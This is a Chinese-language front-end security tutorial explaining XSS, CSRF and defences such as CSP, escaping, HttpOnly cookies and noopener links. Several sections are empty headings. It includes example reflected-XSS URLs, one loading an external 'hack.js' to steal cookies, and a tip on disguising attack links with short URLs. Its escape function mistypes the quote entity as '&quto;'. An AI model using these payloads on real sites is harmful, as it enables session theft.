---
order: 4
---

# 前端安全

## 一、XSS(跨站点脚本攻击)

- XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS 重叠，所以只能叫 XSS。
- 跨站脚本攻击，是指通过存在安全漏洞的 Web 网站，注册用户的浏览器内运行非法的非本站点 JavaScript 脚本进行的一种攻击。

跨站脚本攻击有可能造成以下影响：

- 利用虚假输入表单骗取用户个人信息。
- 利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
- 显示伪造的文章或图片。
- 获取页面数据
- 劫持前端逻辑
- 发送请求
- 偷取网站的任意数据
- 偷取用户的资料，偷取用户的秘密和登录态
- 欺骗用户

### 1.1 XSS 分类

- `反射型`：url 参数直接注入

所谓反射型，就是攻击脚本必须放在另外的地方，才能完成攻击:

```text
// 普通
http://localhost:3000/?from=china
// alert尝试
http://localhost:3000/?from=<script>alert(3)</script>
// 获取Cookie
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"> </script>
```

为了在 url 不被一眼看出来攻击脚本，可以使用短域名伪造

短域名伪造（https://dwz.cn/）之后，得到的url和原本的攻击url是同等效力的。

- `存储型`：存储到 DB 后读取时注入

在页面上通过表单输入的攻击脚本，存储注入在数据库中，等到页面刷新获取到该数据时，攻击脚本就被执行

### 1.2 防御手段（4 种）

1. `head 设置 X-XSS-Protection（已过时，chrome 已经将该功能去掉了`

2. `CSP 内容安全策略 (CSP, Content Security Policy)`

CSP 是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注入等攻击。

CSP 本质上就是建立白名单，开发者**明确告诉浏览器哪些外部资源可以加载和执行**。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。

服务端配置：

```sh
# 只允许加载本站资源
Content-Security-Policy: default-src 'self'
# 只允许加载 HTTPS 协议图片
Content-Security-Policy: img-src https://*
# 不允许加载任何来源框架
Content-Security-Policy: child-src 'none'

ctx.set('Content-Security-Policy', "default-src 'self'")
```

3. `转义字符`

- 黑名单转义（定义哪些符号不行）
  - 用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠等，进行转义
  - 但对于富文本来说，显然不能通过上面黑名单的办法来转义所有字符，因为这样会把需要的格式也过滤掉。当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，因此对于富文本，通常采用白名单转义过滤的办法。

```ts
function escape(str) {
  str = str.replace(/&/g, '&amp;');
  str = str.replace(/</g, '&lt;');
  str = str.replace(/>/g, '&gt;');
  str = str.replace(/"/g, '&quto;');
  str = str.replace(/'/g, '&#39;');
  str = str.replace(/`/g, '&#96;');
  str = str.replace(/\//g, '&#x2F;');
  return str;
}

escape(ctx.query.from);
```

- 白名单转义（定义哪些符号可以）

白名单内的不会被过滤掉，只有白名单之外的会被过滤掉白名单过滤的实现是比较复杂的，所以通常使用第三方库 xss 来做：

```ts
const xss = require('xss');
let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>');
// 转义为 => <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;
console.log(html);
```

4. `Cookie设置httpOnly`

> 这是预防 XSS 攻击窃取用户 cookie，最有效的防御手段。

Web 应用程序在设置 [cookie](/big-frontend/前端/browser#72-cookie) 时，将其属性设为 HttpOnly，就可以避免该网页的 cookie 被客户端恶意 JavaScript 窃取，保护用户 cookie 信息。

（使用 cookie 登录鉴权过程中，实际根本不需要客户端 js 参与，因此后端添加 httpOnly 只在网络传输中使用，是完全合理的）

```js
response.addHeader('Set-Cookie', 'uid=112; Path=/; HttpOnly');
```

### 1.3 a 标签 rel=”noopener noreferrer”属性的作用详解

没有 rel=“noopener noreferrer”的情况下使用 target=“\_blank”是有安全风险，超链接 a 标签的 rel="noopener noreferrer"属性是一种新特性，它能让网站更安全，可以防止钓鱼网站，因为它获取的 window.opener 的值为 null。

#### window.opener

window.opener 实际上就是通过 window.open 打开的窗体的父窗体。通过 window.opener 可以获取到源页面的部分控制权，即使新打开的页面是跨域也可以获取部分控制权。

比如在父窗体 parentForm 里面 通过 window.open("subForm.html"),那么在 subform.html 中 window.opener

就代表 parentForm,可以通过这种方式设置父窗体的值或者调用 js 方法。

如：1,window.opener.test(); ---调用父窗体中的 test()方法

2,如果 window.opener 存在,设置 parentForm 中 stockBox 的值。

```js
if (window.opener && !window.opener.closed) {
  window.opener.document.parentForm.stockBox.value = symbol;
}
```

## 二、CSRF(跨站请求伪造)

CSRF(Cross Site Request Forgery)，即跨站请求伪造，是一种常见的 Web 攻击，它利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。流程如下：

- 受害者登录 a.com，并保留了登录凭证（Cookie）。
- 攻击者引诱受害者访问了 b.com。
- `b.com 向 a.com`发送了一个请求：a.com/act=xx。浏览器会默认携带 a.com 的 Cookie。
- a.com 接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。
- a.com 以受害者的名义执行了 act=xx。
- 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让 a.com 执行了自己定义的操作。

## 三、clickjacking(点击劫持)

## 四、SQL 注入

## 五、OS 命令注入

## 六、请求劫持（运营商劫持）

## 七、DDOS（分布式停止服务攻击）
